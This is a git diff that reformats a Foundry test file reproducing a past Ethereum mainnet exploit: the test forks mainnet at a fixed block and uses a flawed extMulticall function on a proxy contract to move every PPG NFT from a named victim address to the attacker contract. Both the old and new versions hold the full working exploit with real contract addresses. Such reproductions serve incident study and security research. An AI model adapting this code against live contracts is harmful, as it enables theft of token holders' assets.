@@ -18,10 +18,7 @@ import "./../interface.sol";
 // https://defimon.xyz/exploit/mainnet/0x7e5433f02f4bf07c4f2a2d341c450e07d7531428
 
 interface IPPGToken is IERC721 {
-    function tokenOfOwnerByIndex(
-        address owner,
-        uint256 index
-    ) external view returns (uint256);
+    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
 }
 
 interface IERC1967Proxy {
@@ -36,59 +33,35 @@ interface IERC1967Proxy {
 }
 
 contract ContractTest is Test {
-    IPPGToken private constant PPG =
-        IPPGToken(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
-    IERC1967Proxy private constant ERC1967Proxy =
-        IERC1967Proxy(0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE);
-    address private constant victim =
-        0xe5442aE87E0fEf3F7cc43E507adF786c311a0529;
+    IPPGToken private constant PPG = IPPGToken(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
+    IERC1967Proxy private constant ERC1967Proxy = IERC1967Proxy(0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE);
+    address private constant victim = 0xe5442aE87E0fEf3F7cc43E507adF786c311a0529;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18802287);
+        vm.createSelectFork("mainnet", 18_802_287);
         vm.label(address(PPG), "PPG");
         vm.label(address(ERC1967Proxy), "ERC1967Proxy");
         vm.label(victim, "victim");
     }
 
     function testExploit() public {
-        emit log_named_uint(
-            "Victim PPG token balance before attack",
-            PPG.balanceOf(victim)
-        );
-        emit log_named_uint(
-            "Attacker PPG token balance before attack",
-            PPG.balanceOf(address(this))
-        );
+        emit log_named_uint("Victim PPG token balance before attack", PPG.balanceOf(victim));
+        emit log_named_uint("Attacker PPG token balance before attack", PPG.balanceOf(address(this)));
 
-        IERC1967Proxy.CallData[] memory calls = new IERC1967Proxy.CallData[](
-            PPG.balanceOf(victim)
-        );
+        IERC1967Proxy.CallData[] memory calls = new IERC1967Proxy.CallData[](PPG.balanceOf(victim));
 
         for (uint256 i; i < PPG.balanceOf(victim); ++i) {
             uint256 id = PPG.tokenOfOwnerByIndex(victim, i);
-            bytes memory data = abi.encodeWithSignature(
-                "safeTransferFrom(address,address,uint256)",
-                victim,
-                address(this),
-                id
-            );
-            IERC1967Proxy.CallData memory callData = IERC1967Proxy.CallData({
-                target: address(PPG),
-                callData: data
-            });
+            bytes memory data =
+                abi.encodeWithSignature("safeTransferFrom(address,address,uint256)", victim, address(this), id);
+            IERC1967Proxy.CallData memory callData = IERC1967Proxy.CallData({target: address(PPG), callData: data});
             calls[i] = callData;
         }
         // Flawed function
         ERC1967Proxy.extMulticall(calls);
 
-        emit log_named_uint(
-            "Victim PPG token balance after attack",
-            PPG.balanceOf(victim)
-        );
-        emit log_named_uint(
-            "Attacker PPG token balance after attack",
-            PPG.balanceOf(address(this))
-        );
+        emit log_named_uint("Victim PPG token balance after attack", PPG.balanceOf(victim));
+        emit log_named_uint("Attacker PPG token balance after attack", PPG.balanceOf(address(this)));
     }
 
     function onERC721Received(
